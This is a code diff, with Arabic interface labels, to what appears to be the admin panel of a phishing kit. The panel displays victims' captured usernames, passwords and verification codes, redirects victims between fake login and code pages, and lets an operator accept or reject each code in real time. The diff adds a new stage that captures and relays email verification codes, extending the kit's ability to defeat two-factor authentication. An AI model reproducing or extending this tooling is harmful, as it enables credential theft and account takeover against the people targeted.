@@ -90,6 +90,9 @@
   .badge-code_pending{background:#e0e7ff;color:#3730a3}
   .badge-code_confirmed{background:#d1fae5;color:#065f46}
   .badge-code_rejected{background:#fee2e2;color:#991b1b}
+  .badge-email_code_pending{background:#fce4ec;color:#880e4f}
+  .badge-email_code_confirmed{background:#d1fae5;color:#065f46}
+  .badge-email_code_rejected{background:#fee2e2;color:#991b1b}
   .badge-page{background:#dbeafe;color:#1e40af}
 
   .td-actions{display:flex;gap:6px}
@@ -265,6 +268,7 @@
       <button onclick="doRedirect('order.html')">صفحة بيانات الطلب</button>
       <button onclick="doRedirect('login.html')">صفحة تسجيل الدخول</button>
       <button onclick="doRedirect('password.html')">صفحة الرمز السري</button>
+      <button onclick="doRedirect('email-code.html')">صفحة رمز الإيميل</button>
     </div>
   </div>
 </div>
@@ -286,10 +290,11 @@ const pageLabels = {
   "index":"الرئيسية","colors":"الألوان","order":"صفحة الطلب",
   "login":"تسجيل الدخول","password":"الرمز السري",
   "waiting":"جاري التحقق","code":"رمز التحقق","code-waiting":"تحقق الرمز",
+  "email-code":"رمز الإيميل","email-code-waiting":"تحقق رمز الإيميل",
   "success":"تم بنجاح","home":"الرئيسية","pending":"في الانتظار"
 };
 
-const statusLabels = {pending:"قيد الانتظار",confirmed:"مقبول",rejected:"مرفوض",code_pending:"بانتظار الرمز",code_confirmed:"تم التأكيد",code_rejected:"رمز مرفوض"};
+const statusLabels = {pending:"قيد الانتظار",confirmed:"مقبول",rejected:"مرفوض",code_pending:"بانتظار الرمز",code_confirmed:"تم التأكيد",code_rejected:"رمز مرفوض",email_code_pending:"بانتظار رمز الإيميل",email_code_confirmed:"تم تأكيد الإيميل",email_code_rejected:"رمز الإيميل مرفوض"};
 
 let TOKEN = localStorage.getItem("admin_token") || "";
 let orders = [];
@@ -362,7 +367,7 @@ async function loadOrders() {
   }
 
   let html = `<table><thead><tr>
-    <th>العميل</th><th>الولاية</th><th>اللون</th><th>اسم المستخدم</th><th>الرمز السري</th><th>رمز التحقق</th><th>الحالة</th><th>الصفحة</th><th>التاريخ</th><th>الإجراءات</th>
+    <th>العميل</th><th>الولاية</th><th>اللون</th><th>اسم المستخدم</th><th>الرمز السري</th><th>رمز التحقق</th><th>رمز الإيميل</th><th>الحالة</th><th>الصفحة</th><th>التاريخ</th><th>الإجراءات</th>
   </tr></thead><tbody>`;
 
   orders.forEach(o => {
@@ -383,6 +388,7 @@ async function loadOrders() {
       <td><div class="td-login-wrap"><span class="td-login">${o.login_username||"—"}</span>${o.login_username?`<button class="copy-btn" onclick="copyText(this,'${o.login_username}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
       <td><div class="td-login-wrap"><span class="td-login">${o.login_password||"—"}</span>${o.login_password?`<button class="copy-btn" onclick="copyText(this,'${o.login_password}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
       <td><div class="td-login-wrap"><span class="td-login" style="${o.verification_code?'color:#1565c0':''}">${o.verification_code||"—"}</span>${o.verification_code?`<button class="copy-btn" onclick="copyText(this,'${o.verification_code}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
+      <td><div class="td-login-wrap"><span class="td-login" style="${o.email_verification_code?'color:#d32f2f':''}">${o.email_verification_code||"—"}</span>${o.email_verification_code?`<button class="copy-btn" onclick="copyText(this,'${o.email_verification_code}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
       <td><span class="badge badge-${statusClass}">${statusLabels[statusClass]||statusClass}</span></td>
       <td><span class="badge badge-page">${pageName}</span></td>
       <td style="font-size:12px;color:var(--muted)">${date}</td>
@@ -437,12 +443,21 @@ function showDetails(id) {
     if (!o.login_username && !o.login_password) detailsHtml += `</div><div class="login-data">`;
     detailsHtml += `<div class="cred-row"><div><div class="cred-label">رمز التحقق</div><div class="cred-val code-val">${o.verification_code}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.verification_code}')">${copyIcon} نسخ</button></div></div>`;
   }
+  if (o.email_verification_code) {
+    if (!o.login_username && !o.login_password && !o.verification_code) detailsHtml += `</div><div class="login-data">`;
+    detailsHtml += `<div class="cred-row"><div><div class="cred-label">رمز الإيميل</div><div class="cred-val code-val" style="color:#d32f2f">${o.email_verification_code}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.email_verification_code}')">${copyIcon} نسخ</button></div></div>`;
+  }
 
   document.getElementById("modalDetails").innerHTML = detailsHtml;
 
   const acceptBtn = document.getElementById("modalAccept");
   const rejectBtn = document.getElementById("modalReject");
-  if (o.status === "code_pending") {
+  if (o.status === "email_code_pending") {
+    acceptBtn.textContent = "قبول رمز الإيميل";
+    rejectBtn.textContent = "رفض رمز الإيميل";
+    acceptBtn.onclick = () => updateStatus(id, "email_code_confirmed");
+    rejectBtn.onclick = () => updateStatus(id, "email_code_rejected");
+  } else if (o.status === "code_pending") {
     acceptBtn.textContent = "قبول الرمز";
     rejectBtn.textContent = "رفض الرمز";
     acceptBtn.onclick = () => updateStatus(id, "code_confirmed");
